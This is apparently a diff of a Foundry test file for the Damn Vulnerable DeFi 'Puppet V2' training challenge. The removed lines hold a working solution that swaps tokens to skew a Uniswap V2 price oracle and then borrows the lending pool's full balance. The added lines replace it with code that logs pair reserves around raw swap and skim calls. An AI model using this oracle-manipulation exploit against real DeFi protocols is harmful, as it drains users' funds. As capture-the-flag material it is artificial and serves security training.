@@ -8,31 +8,27 @@ import {IUniswapV2Factory} from "@uniswap/v2-core/contracts/interfaces/IUniswapV
 import {IUniswapV2Router02} from "@uniswap/v2-periphery/contracts/interfaces/IUniswapV2Router02.sol";
 import {WETH} from "solmate/tokens/WETH.sol";
 import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
-import {PuppetV2Pool} from "../../src/puppet-v2/PuppetV2Pool.sol";
 
-contract PuppetV2Challenge is Test {
+contract UniswapV2 is Test {
     address deployer = makeAddr("deployer");
     address player = makeAddr("player");
     address recovery = makeAddr("recovery");
 
     uint256 constant UNISWAP_INITIAL_TOKEN_RESERVE = 100e18;
-    uint256 constant UNISWAP_INITIAL_WETH_RESERVE = 10e18;
-    uint256 constant PLAYER_INITIAL_TOKEN_BALANCE = 10_000e18;
-    uint256 constant PLAYER_INITIAL_ETH_BALANCE = 20e18;
-    uint256 constant POOL_INITIAL_TOKEN_BALANCE = 1_000_000e18;
+    uint256 constant UNISWAP_INITIAL_WETH_RESERVE = 100e18;
+    uint256 constant PLAYER_INITIAL_TOKEN_BALANCE = 100e18;
+    uint256 constant PLAYER_INITIAL_ETH_BALANCE = 100e18;
 
     WETH weth;
     DamnValuableToken token;
     IUniswapV2Factory uniswapV2Factory;
     IUniswapV2Router02 uniswapV2Router;
     IUniswapV2Pair uniswapV2Exchange;
-    PuppetV2Pool lendingPool;
 
     modifier checkSolvedByPlayer() {
         vm.startPrank(player, player);
         _;
         vm.stopPrank();
-        _isSolved();
     }
 
     /**
@@ -48,8 +44,9 @@ contract PuppetV2Challenge is Test {
 
         // Deploy Uniswap V2 Factory and Router
         uniswapV2Factory = IUniswapV2Factory(
-            deployCode(string.concat(vm.projectRoot(), "/builds/uniswap/UniswapV2Factory.json"), abi.encode(address(0)))
+            deployCode(string.concat(vm.projectRoot(), "/builds/uniswap/UniswapV2Factory.json"), abi.encode(address(recovery)))
         );
+
         uniswapV2Router = IUniswapV2Router02(
             deployCode(
                 string.concat(vm.projectRoot(), "/builds/uniswap/UniswapV2Router02.json"),
@@ -69,13 +66,8 @@ contract PuppetV2Challenge is Test {
         });
         uniswapV2Exchange = IUniswapV2Pair(uniswapV2Factory.getPair(address(token), address(weth)));
 
-        // Deploy the lending pool
-        lendingPool =
-            new PuppetV2Pool(address(weth), address(token), address(uniswapV2Exchange), address(uniswapV2Factory));
-
         // Setup initial token balances of pool and player accounts
         token.transfer(player, PLAYER_INITIAL_TOKEN_BALANCE);
-        token.transfer(address(lendingPool), POOL_INITIAL_TOKEN_BALANCE);
 
         vm.stopPrank();
     }
@@ -86,54 +78,34 @@ contract PuppetV2Challenge is Test {
     function test_assertInitialState() public view {
         assertEq(player.balance, PLAYER_INITIAL_ETH_BALANCE);
         assertEq(token.balanceOf(player), PLAYER_INITIAL_TOKEN_BALANCE);
-        assertEq(token.balanceOf(address(lendingPool)), POOL_INITIAL_TOKEN_BALANCE);
         assertGt(uniswapV2Exchange.balanceOf(deployer), 0);
-
-        // Check pool's been correctly setup
-        assertEq(lendingPool.calculateDepositOfWETHRequired(1 ether), 0.3 ether);
-        assertEq(lendingPool.calculateDepositOfWETHRequired(POOL_INITIAL_TOKEN_BALANCE), 300000 ether);
     }
 
     /**
      * CODE YOUR SOLUTION HERE
      */
     function test_puppetV2() public checkSolvedByPlayer {
-        address[] memory path = new address[](2);
-        path[1] = address(token);
-        path[0] = address(weth);
+        (uint reserve0, uint reserve1,) = uniswapV2Exchange.getReserves();
+        console.log(reserve0);
+        console.log(reserve1);
 
-        uniswapV2Router.swapExactETHForTokens{value: player.balance}(
-            10,
-            path,
+        token.transfer(address(uniswapV2Exchange), 50e18);
+
+        uniswapV2Exchange.swap(
+            20e18,
+            0,
             player,
-            block.timestamp + 3600
+            ""
         );
 
-        address[] memory path2 = new address[](2);
-        path2[0] = address(token);
-        path2[1] = address(weth);
+        (uint reserve0_1, uint reserve1_1,) = uniswapV2Exchange.getReserves();
+        console.log(reserve0_1);
+        console.log(reserve1_1);
 
-        token.approve(address(uniswapV2Router), token.balanceOf(player));
-        uniswapV2Router.swapExactTokensForTokens(
-            token.balanceOf(player),
-            10,
-            path2,
-            player,
-            block.timestamp + 3600
-        );
+        uniswapV2Exchange.skim(player);
 
-        weth.approve(address(lendingPool), weth.balanceOf(player));
-        lendingPool.borrow(POOL_INITIAL_TOKEN_BALANCE);
-
-        token.transfer(recovery, POOL_INITIAL_TOKEN_BALANCE);
-
-    }
-
-    /**
-     * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
-     */
-    function _isSolved() private view {
-        assertEq(token.balanceOf(address(lendingPool)), 0, "Lending pool still has tokens");
-        assertEq(token.balanceOf(recovery), POOL_INITIAL_TOKEN_BALANCE, "Not enough tokens in recovery account");
+        (uint reserve0_2, uint reserve1_2,) = uniswapV2Exchange.getReserves();
+        console.log(reserve0_2);
+        console.log(reserve1_2);
     }
 }
